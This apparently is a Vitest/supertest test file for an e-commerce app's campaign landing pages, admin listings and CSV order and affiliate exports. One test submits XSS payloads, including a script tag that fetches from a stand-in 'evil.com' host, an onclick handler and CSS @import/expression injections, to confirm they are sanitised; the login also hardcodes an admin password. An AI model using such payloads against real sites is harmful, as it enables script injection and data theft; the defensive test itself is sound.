import { describe, it, expect, beforeAll } from 'vitest';
import request from 'supertest';
import { app } from '../src/app.js';

describe('LazyForge Campaign Landing Pages & CSV Export Engine', () => {
  let adminCookie = '';

  beforeAll(async () => {
    // Authenticate as administrator
    const loginRes = await request(app)
      .post('/api/v1/auth/login')
      .send({
        email: 'admin@lazyforge.com',
        password: 'LazyForgeAdmin2026!',
      });

    expect(loginRes.status).toBe(200);
    const cookies = loginRes.headers['set-cookie'];
    adminCookie = Array.isArray(cookies) ? cookies.join('; ') : cookies;
  });

  it('GET /api/v1/campaigns/:slug retrieves published campaign page', async () => {
    const res = await request(app).get('/api/v1/campaigns/robot-mascot');

    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(res.body.data.slug).toBe('robot-mascot');
    expect(res.body.data.title).toContain('Apex-01');
    expect(Array.isArray(res.body.data.sections)).toBe(true);
    expect(res.body.data.sections.length).toBeGreaterThan(0);
  });

  it('GET /api/v1/campaigns/:slug returns 404 for unknown or unpublished campaign', async () => {
    const res = await request(app).get('/api/v1/campaigns/non-existent-circuit-404');

    expect(res.status).toBe(404);
    expect(res.body.success).toBe(false);
  });

  it('GET /api/v1/admin/landing-pages lists campaign pages for admin', async () => {
    const res = await request(app)
      .get('/api/v1/admin/landing-pages')
      .set('Cookie', adminCookie);

    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(Array.isArray(res.body.data)).toBe(true);
    expect(res.body.data.some((p) => p.slug === 'robot-mascot')).toBe(true);
  });

  it('POST /api/v1/admin/landing-pages creates version and sanitizes malicious XSS scripts (REQ-10)', async () => {
    const payload = {
      title: 'Cyber Spider Bot Launch',
      slug: `spider-bot-${Date.now()}`,
      status: 'published',
      sections: [
        {
          id: 'hero-1',
          type: 'hero',
          heading: 'Autonomous Spider Bot <script>alert("hacked")</script>',
          subheading: 'Precision mechanics and micro-servos.',
          customHtml: '<div onclick="steal()">Safe Content</div><script>fetch("evil.com")</script>',
        },
      ],
      custom_css: 'body { color: cyan; } @import url("evil.css"); expression(alert(1));',
    };

    const res = await request(app)
      .post('/api/v1/admin/landing-pages')
      .set('Cookie', adminCookie)
      .send(payload);

    expect(res.status).toBe(201);
    expect(res.body.success).toBe(true);
    expect(res.body.data.versionNumber).toBe(1);

    // Verify sanitized on public fetch
    const publicRes = await request(app).get(`/api/v1/campaigns/${res.body.data.slug}`);
    expect(publicRes.status).toBe(200);

    const savedHero = publicRes.body.data.sections[0];
    expect(savedHero.heading).not.toContain('<script>');
    expect(savedHero.customHtml).not.toContain('<script>');
    expect(savedHero.customHtml).not.toContain('onclick');
    expect(publicRes.body.data.customCss).not.toContain('@import');
    expect(publicRes.body.data.customCss).not.toContain('expression(');
  });

  it('GET /api/v1/admin/orders/export downloads CSV report with proper headers', async () => {
    const res = await request(app)
      .get('/api/v1/admin/orders/export')
      .set('Cookie', adminCookie);

    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toContain('text/csv');
    expect(res.headers['content-disposition']).toContain('attachment; filename="lazyforge-orders-');
    expect(res.text).toContain('Order Number');
    expect(res.text).toContain('Customer Name');
    expect(res.text).toContain('Total Amount (BDT)');
  });

  it('GET /api/v1/admin/affiliates/export downloads affiliate partners CSV report', async () => {
    const res = await request(app)
      .get('/api/v1/admin/affiliates/export')
      .set('Cookie', adminCookie);

    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toContain('text/csv');
    expect(res.headers['content-disposition']).toContain('attachment; filename="lazyforge-affiliates-');
    expect(res.text).toContain('Partner Name');
    expect(res.text).toContain('Referral Code');
    expect(res.text).toContain('CYBERCREATOR');
  });
});
